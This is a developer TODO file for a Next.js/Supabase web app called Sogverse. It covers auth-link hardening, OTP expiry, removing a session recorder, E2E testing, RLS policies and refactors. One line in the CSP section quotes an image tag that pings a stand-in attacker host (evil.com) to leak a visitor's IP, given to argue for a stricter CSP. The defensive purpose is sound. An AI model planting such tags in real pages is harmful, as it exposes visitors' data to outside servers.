# Sogverse TODO

## Cleanup

- [ ] Remove `FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true` from `.github/workflows/ci.yml` after June 2, 2026 (Node.js 24 becomes the default runner)
- [ ] Add CHECK constraints to `profiles.locale` (`IN ('en', 'fi', 'sv', 'tlh')`) and `profiles.currency` (`IN ('EUR', 'SEK', 'USD', 'GBP')`) — both are plain text columns with app-level validation only
- [ ] **Eliminate the extra reload on first-device-login for locale-dependent SSR.** `LocaleProvider` currently reconciles a stale `locale` cookie with `profile.locale` on mount and calls `router.refresh()`, which produces a visible second render on the first page after signing in on a new device. The underlying issue: next-intl's `getRequestConfig` runs before auth is available and can only read cookies/headers, so a client-side reconciliation step is the only option. This is a canary — any future pre-render preference (timezone, theme-critical CSS, feature flags, anything that needs to be baked into SSR output) will hit the same pattern where "cookie is a cache of profile state" and new devices always miss the cache. Two architectural fixes worth considering: (a) write preference cookies server-side during the auth callback so SSR sees them on the very next request (cheap per login, no per-render cost), or (b) thread the authenticated user through `getRequestConfig` so it can read the profile directly (per-request DB cost but no divergence possible). (a) is the better default.
- [ ] **Split invite and password-reset OTP expiry.** `supabase/config.toml` `auth.email.otp_expiry` is set to 259200 (72 hours) so gedu invite links stay valid over a weekend. The setting is global across *all* email OTPs, so password reset links also live for 72h — longer than ideal for a credential-reset flow. Fix: move gedu invites to a custom flow (server-side invite table with its own TTL, admin-generated one-shot token, exchanged for a Supabase session on click) and drop the config.toml value back to 3600. Relates to `src/app/api/admin/create-gedu/route.ts` and `src/components/auth/setup-account-form.tsx`.
- [ ] **Move email auth links to a scanner-resistant token_hash flow.** Our gedu invite and password-reset emails currently embed Supabase's `/auth/v1/verify?token=...` URL directly (from `generateLink().properties.action_link`). That URL is a bare HTTP GET that Gmail/Outlook/enterprise SafeLinks/Proofpoint etc. **prefetch**, consuming the single-use OTP before the real user clicks. Symptom: user clicks the email, lands on `/setup-account#error=otp_expired`, sees "Unauthorized" or an empty form. Observed once in the 2026-04-14 Finnish gedu batch (Viljamaria — Gmail scanner at IP `172.253.15.237` clicked 40s after send). Roughly 1 in 13 today; will get worse on Outlook/M365 recipients. Fix: switch to the token_hash pattern — `generateLink` also returns `properties.hashed_token`; embed our own domain (e.g. `https://sogverse.sog.gg/accept-invite?token_hash={hash}&type=invite`) and have that page call `supabase.auth.verifyOtp({ token_hash, type })` from client JS on mount. Scanners don't execute JS, so the hash survives. Apply to `gedu-invite.ts`, `password-reset.ts`, and whatever other `generateLink` usages exist. Monitor first; revisit if it bites more users.
- [ ] **Remove Mouseflow integration after Beta ends.** This is a temporary session-recording / consent-banner setup added to learn how users interact with the site. To remove it cleanly:
  1. Delete `src/components/layout/mouseflow-consent.tsx`
  2. Remove the `MouseflowConsent` export from `src/components/layout/index.ts`
  3. Remove the `MouseflowConsent` import and `<MouseflowConsent />` render from `src/app/layout.tsx`
  4. Remove `https://*.mouseflow.com` (and its comment) from the `connect-src` line in `src/proxy.ts`
  5. Remove the `"mouseflow"` namespace from `messages/en.json`, `messages/fi.json`, and `messages/sv.json`
  6. Delete all recorded sessions in the Mouseflow dashboard and close/downgrade the Mouseflow account
  7. Sanity check: `git grep -i mouseflow` should return nothing

### E2E Tests with Local Supabase

Current E2E tests only cover unauthenticated flows (page renders, redirects). Authenticated tests (admin-only pages, role-based routing, CRUD operations) need real Supabase Auth + Postgres but shouldn't depend on the remote instance.

**Approach:** Run `supabase start` in CI to spin up a local Supabase stack (Postgres, Auth, Storage) in Docker. Existing migration files are applied automatically, giving an identical schema. Test accounts are created via `supabase/seed.sql`.

Setup tasks:
- [ ] Add `supabase/seed.sql` with test accounts (admin, customer, gedu, gamer) using known passwords
- [ ] Add `.env.test.local` with local Supabase URL/keys (`supabase start` prints these)
- [ ] Create Playwright auth setup project that logs in via the UI and saves `storageState` per role
- [ ] Update `playwright.config.ts` with auth setup project and role-specific test projects
- [ ] Add GitHub Actions step: `supabase start` → `npm run dev` (with test env) → `npx playwright test`

Test cases to add:
- [ ] Admin can view `/admin/products` (sees "Products" heading)
- [ ] Non-admin roles (customer, gedu, gamer) are redirected away from `/admin/*` to their own dashboard
- [ ] Admin can create a product via the add form
- [ ] Admin can edit an existing product
- [ ] Real auth flows (register, login, logout)
- [ ] Customer adding a gamer
- [ ] Core purchase flow

**Why:** RLS policies and role-based routing are complex enough that testing against a real DB catches integration bugs that mocked tests miss. Local Supabase keeps tests fast, deterministic, and free from network flakiness — and Docker is available by default in GitHub Actions runners.

### Shared `<Select>` UI Component

Several files define inline `selectClassName` strings that duplicate `<Input>` styling for native `<select>` elements. Extract a `components/ui/select.tsx` wrapper and replace the inline patterns.

- [ ] Create `src/components/ui/select.tsx` wrapping a native `<select>` with Input-matching styles
- [ ] Replace inline select styling in `location-form-dialog.tsx`, `gedu-groups-card.tsx`, and any other occurrences

### Host Product Images and Tighten CSP `img-src`

Product images are currently arbitrary URLs provided by admins. The CSP `img-src` directive must allow `https:` (any HTTPS source) to accommodate this, which means an attacker who achieves HTML injection could load `<img src="https://evil.com/track?...">` to ping an external server and leak the visitor's IP.

- [ ] Add image upload to product creation (Supabase Storage or an image CDN like Cloudinary)
- [ ] Migrate existing product image URLs to hosted images
- [ ] Tighten CSP `img-src` from `'self' data: blob: https:` to `'self' data: blob: https://your-cdn-domain.com` in `src/proxy.ts`

**Why:** The current `https:` wildcard is low risk (admins are trusted, and `<img>` tags can't read cookies or page content), but tightening it to a specific domain closes the exfiltration-via-image-ping vector entirely. This is the last meaningful CSP gap after the nonce-based `script-src` fix.


### Parent-Managed Gamer Profile Fields (DOB, Gender)

Customers (parents) will set `date_of_birth` and `gender` on their linked gamers. When implemented, add a "Parents can update linked gamer profiles" UPDATE policy on `gamer_profiles` using `is_parent_of(user_id)` and consider restricting the current "Gamers can update own gamer_profile" policy. Age should be derived from `date_of_birth`, never stored directly.

### WhatsApp Service Layer Extraction

The send route (`src/app/api/admin/whatsapp/send/route.ts`) and webhook handler (`src/app/api/webhooks/whatsapp/route.ts`) perform direct Supabase inserts/upserts instead of delegating to `WhatsAppService`. The webhook also contains business logic (message parsing, error code mapping, status transformation) that belongs in a service or utility layer.

- [ ] Add server-side methods to `WhatsAppService` (e.g., `storeOutboundMessage()`, `upsertInboundMessage()`, `updateMessageStatus()`)
- [ ] Extract `extractMessageContent()` and error-code mapping from the webhook into `src/lib/whatsapp.ts`
- [ ] Update both route handlers to delegate persistence to the service

### Extract `mapParticipant` from `VoiceRoomProvider`

`mapParticipant` is a private function in `src/components/voice/VoiceRoomProvider.tsx:33` — not exported. Because it couldn't be imported, `tests/unit/voice/map-participant.test.ts` copy-pasted the function body and wrote tests against the copy. The two versions had already drifted: the test copy added defensive fallbacks (`|| "gamer"`, `?? false`, `?.state`) that production doesn't have, so tests were asserting behavior production didn't implement and nobody noticed until we expanded lint to cover `tests/`.

- [ ] Extract a pure `parseUserName(user_name: string): { userId, role, userName }` helper into a new file (e.g. `src/components/voice/mapParticipant.ts`). This is the bit with real logic worth testing.
- [ ] Leave `mapParticipant` itself as a thin wrapper in `VoiceRoomProvider.tsx` that calls `parseUserName` and assembles the `VoiceParticipant` object with Daily tracks + position. No tests needed for the wrapper.
- [ ] Rewrite `tests/unit/voice/map-participant.test.ts` (probably rename to `parse-user-name.test.ts`) to import the real `parseUserName`. Delete the local hand-copied version.
- [ ] While you're in there: decide what should happen on a malformed `user_name` (Daily types say `string` but our join-token code is the only writer, and the current code silently produces `role: undefined` on input without pipe separators). Two reasonable options: (a) throw in `parseUserName` so bad tokens surface loudly, (b) return a sentinel role and log. Leaning toward (a) — if it ever happens it's a bug in our token generation, not something to paper over.

**Why this matters:** the test drift was a silent quality problem. The `no-unnecessary-condition` lint rule caught it only because we widened lint to `tests/` — the test file had `?.state` chains that TS said were unreachable, which was the thread that led to discovering the duplicated logic. Extracting the parser eliminates the duplication class entirely.

### Multi-Parent Gamer Linking

Currently the only way to link a parent to a gamer is when the parent creates the gamer via `POST /api/gamers/create`. To support a second parent linking to an existing gamer:

- [ ] Choose an authorization mechanism (invite code, existing parent approval, or admin-only)
- [ ] Create a server-side API route (e.g., `POST /api/gamers/link`) that validates authorization before inserting into `parent_gamer` using the admin client
- [ ] Add UI for the chosen flow (e.g., "Share invite code" button for existing parent, "Enter code" form for second parent)
